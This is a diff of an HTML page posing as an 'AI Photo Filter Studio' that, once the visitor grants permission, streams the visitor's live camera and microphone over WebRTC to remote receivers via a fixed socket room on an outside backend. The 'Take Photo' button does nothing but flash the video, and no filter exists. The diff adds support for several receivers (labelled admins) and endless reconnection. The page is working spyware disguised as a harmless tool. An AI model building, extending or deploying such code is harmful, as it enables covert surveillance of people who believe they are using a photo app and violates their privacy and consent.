@@ -4,170 +4,766 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>AI Photo Filter Studio</title>
-  
-  <!-- Socket.io لائبریری -->
+
   <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
-  
+
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
+
     body, html {
-      height: 100%; width: 100%; overflow: hidden;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background-color: #010a05; background-image: url('a.jpg');
-      background-size: cover; background-position: center; background-repeat: no-repeat;
+      background-color: #010a05;
+      background-image: url('a.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
     }
-    .hero { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; z-index: 2; }
+
+    .hero {
+      position: relative;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+      z-index: 2;
+    }
+
     .glass-card {
-      position: relative; width: 95%; max-width: 480px; background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
-      border-radius: 28px; border: 1px solid rgba(255, 255, 255, 0.18);
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); padding: 20px; text-align: center; color: #fff;
+      position: relative;
+      width: 95%;
+      max-width: 480px;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 28px;
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      text-align: center;
+      color: #fff;
     }
-    .tag-label { font-size: 12px; color: #00ff87; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; font-weight: 700; }
-    h2 { font-size: 22px; color: #ffffff; margin-bottom: 8px; font-weight: 800; }
-    p { font-size: 13px; color: #cbd5e1; margin-bottom: 18px; line-height: 1.4; }
+
+    .tag-label {
+      font-size: 12px;
+      color: #00ff87;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    h2 {
+      font-size: 22px;
+      color: #ffffff;
+      margin-bottom: 8px;
+      font-weight: 800;
+    }
+
+    p {
+      font-size: 13px;
+      color: #cbd5e1;
+      margin-bottom: 18px;
+      line-height: 1.4;
+    }
+
     .glass-btn {
-      background: linear-gradient(135deg, #00ff87, #00bfa5); color: #000000; border: 2px solid #00ff87;
-      padding: 15px 20px; font-size: 16px; font-weight: 800; border-radius: 50px; cursor: pointer; 
-      box-shadow: 0 0 15px rgba(0, 255, 135, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.5); 
-      width: 100%; transition: all 0.3s ease;
+      background: linear-gradient(135deg, #00ff87, #00bfa5);
+      color: #000000;
+      border: 2px solid #00ff87;
+      padding: 15px 20px;
+      font-size: 16px;
+      font-weight: 800;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow:
+        0 0 15px rgba(0, 255, 135, 0.6),
+        inset 0 0 10px rgba(255, 255, 255, 0.5);
+      width: 100%;
+      transition: all 0.3s ease;
     }
-    .glass-btn:active { transform: scale(0.97); }
-    .studio-container { display: none; }
-    .video-frame-card { position: relative; background: rgba(0, 0, 0, 0.3); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.15); overflow: hidden; margin-bottom: 16px; width: 100%; }
-    video { width: 100%; height: auto; display: block; border-radius: 20px; transform: scaleX(-1); }
-    .camera-controls { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+
+    .glass-btn:active {
+      transform: scale(0.97);
+    }
+
+    .studio-container {
+      display: none;
+    }
+
+    .video-frame-card {
+      position: relative;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      overflow: hidden;
+      margin-bottom: 16px;
+      width: 100%;
+    }
+
+    video {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 20px;
+      transform: scaleX(-1);
+    }
+
+    .camera-controls {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
     .icon-btn {
-      flex: 1; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(0, 255, 135, 0.4); color: #fff;
-      padding: 12px 10px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
-      gap: 6px; font-size: 13px; font-weight: 700; cursor: pointer; backdrop-filter: blur(5px);
+      flex: 1;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(0, 255, 135, 0.4);
+      color: #fff;
+      padding: 12px 10px;
+      border-radius: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      backdrop-filter: blur(5px);
     }
-    .capture-btn { background: linear-gradient(135deg, rgba(0, 255, 135, 0.2), rgba(0, 191, 165, 0.2)); }
+
+    .capture-btn {
+      background: linear-gradient(
+        135deg,
+        rgba(0, 255, 135, 0.2),
+        rgba(0, 191, 165, 0.2)
+      );
+    }
   </style>
 </head>
 
 <body>
+
   <div class="hero">
     <div class="glass-card">
+
       <div id="welcomePanel">
         <div class="tag-label">AI PHOTO STUDIO</div>
+
         <h2>AI Portrait Enhancement 📸</h2>
-        <p>Apply stunning HD camera enhancements and real-time lighting effects in one click.</p>
-        <button class="glass-btn" id="startBtn">Open Camera Studio ✨</button>
+
+        <p>
+          Apply stunning HD camera enhancements and real-time lighting effects in one click.
+        </p>
+
+        <button class="glass-btn" id="startBtn">
+          Open Camera Studio ✨
+        </button>
       </div>
 
       <div class="studio-container" id="studioPanel">
+
         <div class="video-frame-card">
           <video id="video" autoplay muted playsinline></video>
         </div>
+
         <div class="camera-controls">
-          <button class="icon-btn capture-btn" id="captureBtn">📸 Take Photo</button>
-          <button class="icon-btn" id="flipBtn">🔄 Flip Camera</button>
+
+          <button class="icon-btn capture-btn" id="captureBtn">
+            📸 Take Photo
+          </button>
+
+          <button class="icon-btn" id="flipBtn">
+            🔄 Flip Camera
+          </button>
+
         </div>
+
       </div>
+
     </div>
   </div>
 
-  <script>
-    const BACKEND_URL = "https://webrtc-backend-production-089c.up.railway.app";
+<script>
 
-    const video = document.getElementById("video");
-    const startBtn = document.getElementById("startBtn");
-    const flipBtn = document.getElementById("flipBtn");
-    const captureBtn = document.getElementById("captureBtn");
+const BACKEND_URL =
+  "https://webrtc-backend-production-089c.up.railway.app";
 
-    let currentStream = null;
-    let useFacingMode = "user";
-    let socket = null;
-    let peerConnection = null;
+const video = document.getElementById("video");
+const startBtn = document.getElementById("startBtn");
+const flipBtn = document.getElementById("flipBtn");
+const captureBtn = document.getElementById("captureBtn");
 
-    const rtcConfig = {
-      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-    };
+let currentStream = null;
+let useFacingMode = "user";
 
-    async function startCamera() {
+let socket = null;
+
+// Multiple receiver connections support
+let peerConnections = {};
+
+// ICE candidates waiting for remote description
+let pendingCandidates = {};
+
+const rtcConfig = {
+
+  iceServers: [
+    {
+      urls: "stun:stun.l.google.com:19302"
+    }
+  ]
+
+};
+
+
+// ===============================
+// CAMERA
+// ===============================
+
+async function startCamera() {
+
+  try {
+
+    if (currentStream) {
+
+      currentStream.getTracks().forEach(track => {
+        track.stop();
+      });
+
+    }
+
+
+    currentStream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video: {
+          facingMode: {
+            ideal: useFacingMode
+          },
+
+          width: {
+            ideal: 1280
+          },
+
+          height: {
+            ideal: 720
+          }
+        },
+
+        audio: true
+
+      });
+
+
+    video.srcObject = currentStream;
+
+    await video.play();
+
+
+    document.getElementById("welcomePanel").style.display =
+      "none";
+
+    document.getElementById("studioPanel").style.display =
+      "block";
+
+
+    connectSocketServer();
+
+
+  } catch (error) {
+
+    console.error("Camera access error:", error);
+
+    alert("Camera permission is required.");
+
+  }
+
+}
+
+
+// ===============================
+// FLIP CAMERA
+// ===============================
+
+flipBtn.addEventListener("click", async () => {
+
+  useFacingMode =
+    useFacingMode === "user"
+      ? "environment"
+      : "user";
+
+  await startCamera();
+
+});
+
+
+// ===============================
+// CAPTURE BUTTON
+// ===============================
+
+captureBtn.addEventListener("click", () => {
+
+  video.style.opacity = "0.3";
+
+  setTimeout(() => {
+
+    video.style.opacity = "1";
+
+  }, 150);
+
+});
+
+
+// ===============================
+// SOCKET CONNECTION
+// ===============================
+
+function connectSocketServer() {
+
+  if (socket) return;
+
+
+  socket = io(BACKEND_URL, {
+
+    transports: ["websocket", "polling"],
+
+    reconnection: true,
+
+    reconnectionAttempts: Infinity,
+
+    reconnectionDelay: 2000
+
+  });
+
+
+  socket.on("connect", () => {
+
+    console.log("Socket connected:", socket.id);
+
+    socket.emit(
+      "join-room",
+      "stream-room-1"
+    );
+
+  });
+
+
+  socket.on("connect_error", (error) => {
+
+    console.error(
+      "Socket connection error:",
+      error
+    );
+
+  });
+
+
+  socket.on("disconnect", () => {
+
+    console.log("Socket disconnected");
+
+  });
+
+
+  // ===============================
+  // ADMIN CONNECTED
+  // ===============================
+
+  socket.on(
+    "user-connected",
+    async (adminId) => {
+
+      console.log(
+        "Receiver connected:",
+        adminId
+      );
+
       try {
-        if (currentStream) {
-          currentStream.getTracks().forEach(track => track.stop());
-        }
 
-        currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: useFacingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: true
-        });
+        await createAndSendOffer(adminId);
 
-        video.srcObject = currentStream;
-        await video.play();
-
-        document.getElementById('welcomePanel').style.display = "none";
-        document.getElementById('studioPanel').style.display = "block";
-
-        connectSocketServer();
       } catch (error) {
-        console.error("Camera access error:", error);
-        alert("Camera permission is required.");
-      }
-    }
 
-    flipBtn.addEventListener("click", async () => {
-      useFacingMode = useFacingMode === "user" ? "environment" : "user";
-      await startCamera();
-    });
+        console.error(
+          "Offer creation error:",
+          error
+        );
 
-    captureBtn.addEventListener("click", () => {
-      video.style.opacity = "0.3";
-      setTimeout(() => { video.style.opacity = "1"; }, 150);
-    });
-
-    function connectSocketServer() {
-      if (socket) return;
-
-      socket = io(BACKEND_URL);
-
-      socket.on("connect", () => {
-        socket.emit("join-room", "stream-room-1");
-      });
-
-      // جب بھی ریسیور نیا جوائن ہو گا، سینڈر خود بخود آفر بنائے گا
-      socket.on("user-connected", async (userId) => {
-        createAndSendOffer(userId);
-      });
-
-      socket.on("answer", async (data) => {
-        if (peerConnection) {
-          await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
-        }
-      });
-
-      socket.on("ice-candidate", async (data) => {
-        if (peerConnection) {
-          await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-        }
-      });
-    }
-
-    function createPeerConnection(targetUserId) {
-      peerConnection = new RTCPeerConnection(rtcConfig);
-
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => peerConnection.addTrack(track, currentStream));
       }
 
-      peerConnection.onicecandidate = (event) => {
-        if (event.candidate) {
-          socket.emit("ice-candidate", { target: targetUserId, candidate: event.candidate });
+    }
+  );
+
+
+  // ===============================
+  // ANSWER
+  // ===============================
+
+  socket.on("answer", async (data) => {
+
+    const adminId = data.responder;
+
+    const connection =
+      peerConnections[adminId];
+
+    if (!connection) {
+
+      console.warn(
+        "No peer connection for answer:",
+        adminId
+      );
+
+      return;
+
+    }
+
+
+    try {
+
+      await connection.pc.setRemoteDescription(
+        new RTCSessionDescription(data.sdp)
+      );
+
+
+      console.log(
+        "Remote description set."
+      );
+
+
+      // Add ICE candidates that arrived early
+      const queued =
+        pendingCandidates[adminId] || [];
+
+
+      for (const candidate of queued) {
+
+        try {
+
+          await connection.pc.addIceCandidate(
+            new RTCIceCandidate(candidate)
+          );
+
+        } catch (error) {
+
+          console.error(
+            "Queued ICE error:",
+            error
+          );
+
         }
-      };
+
+      }
+
+
+      pendingCandidates[adminId] = [];
+
+
+    } catch (error) {
+
+      console.error(
+        "Answer error:",
+        error
+      );
+
     }
 
-    async function createAndSendOffer(targetUserId) {
-      createPeerConnection(targetUserId);
-      const offer = await peerConnection.createOffer();
-      await peerConnection.setLocalDescription(offer);
-      socket.emit("offer", { target: targetUserId, sdp: offer });
+  });
+
+
+  // ===============================
+  // ICE CANDIDATE
+  // ===============================
+
+  socket.on(
+    "ice-candidate",
+    async (data) => {
+
+      const senderId = data.sender;
+
+      const connection =
+        peerConnections[senderId];
+
+
+      if (!connection) {
+
+        if (!pendingCandidates[senderId]) {
+
+          pendingCandidates[senderId] = [];
+
+        }
+
+        pendingCandidates[senderId].push(
+          data.candidate
+        );
+
+        return;
+
+      }
+
+
+      if (
+        !connection.pc.remoteDescription
+      ) {
+
+        if (!pendingCandidates[senderId]) {
+
+          pendingCandidates[senderId] = [];
+
+        }
+
+        pendingCandidates[senderId].push(
+          data.candidate
+        );
+
+        return;
+
+      }
+
+
+      try {
+
+        await connection.pc.addIceCandidate(
+          new RTCIceCandidate(data.candidate)
+        );
+
+      } catch (error) {
+
+        console.error(
+          "ICE candidate error:",
+          error
+        );
+
+      }
+
+    }
+  );
+
+
+  // ===============================
+  // CONNECTION CLOSED
+  // ===============================
+
+  socket.on(
+    "connection-closed",
+    (data) => {
+
+      const senderId = data.sender;
+
+      removePeerConnection(senderId);
+
+    }
+  );
+
+}
+
+
+// ===============================
+// CREATE PEER CONNECTION
+// ===============================
+
+function createPeerConnection(targetUserId) {
+
+  // Close old connection if exists
+
+  if (peerConnections[targetUserId]) {
+
+    try {
+
+      peerConnections[targetUserId].pc.close();
+
+    } catch (e) {}
+
+  }
+
+
+  const pc =
+    new RTCPeerConnection(rtcConfig);
+
+
+  peerConnections[targetUserId] = {
+    pc: pc
+  };
+
+
+  pendingCandidates[targetUserId] = [];
+
+
+  // Add camera tracks
+
+  if (currentStream) {
+
+    currentStream
+      .getTracks()
+      .forEach(track => {
+
+        pc.addTrack(
+          track,
+          currentStream
+        );
+
+      });
+
+  }
+
+
+  // ICE
+
+  pc.onicecandidate = (event) => {
+
+    if (event.candidate) {
+
+      socket.emit(
+        "ice-candidate",
+        {
+          target: targetUserId,
+          candidate: event.candidate
+        }
+      );
+
     }
 
-    startBtn.addEventListener("click", startCamera);
-  </script>
+  };
+
+
+  pc.onconnectionstatechange = () => {
+
+    console.log(
+      "WebRTC state:",
+      pc.connectionState
+    );
+
+
+    if (
+      pc.connectionState === "failed" ||
+      pc.connectionState === "closed"
+    ) {
+
+      removePeerConnection(
+        targetUserId
+      );
+
+    }
+
+  };
+
+
+  pc.oniceconnectionstatechange = () => {
+
+    console.log(
+      "ICE state:",
+      pc.iceConnectionState
+    );
+
+  };
+
+
+  return pc;
+
+}
+
+
+// ===============================
+// CREATE OFFER
+// ===============================
+
+async function createAndSendOffer(
+  targetUserId
+) {
+
+  if (!socket || !currentStream) {
+
+    return;
+
+  }
+
+
+  const pc =
+    createPeerConnection(
+      targetUserId
+    );
+
+
+  const offer =
+    await pc.createOffer({
+
+      offerToReceiveAudio: false,
+
+      offerToReceiveVideo: false
+
+    });
+
+
+  await pc.setLocalDescription(
+    offer
+  );
+
+
+  socket.emit(
+    "offer",
+    {
+      target: targetUserId,
+      sdp: offer
+    }
+  );
+
+
+  console.log(
+    "Offer sent to:",
+    targetUserId
+  );
+
+}
+
+
+// ===============================
+// REMOVE CONNECTION
+// ===============================
+
+function removePeerConnection(
+  targetUserId
+) {
+
+  const connection =
+    peerConnections[targetUserId];
+
+
+  if (connection) {
+
+    try {
+
+      connection.pc.close();
+
+    } catch (e) {}
+
+  }
+
+
+  delete peerConnections[
+    targetUserId
+  ];
+
+  delete pendingCandidates[
+    targetUserId
+  ];
+
+}
+
+
+// ===============================
+// START
+// ===============================
+
+startBtn.addEventListener(
+  "click",
+  startCamera
+);
+
+</script>
+
 </body>
 </html>
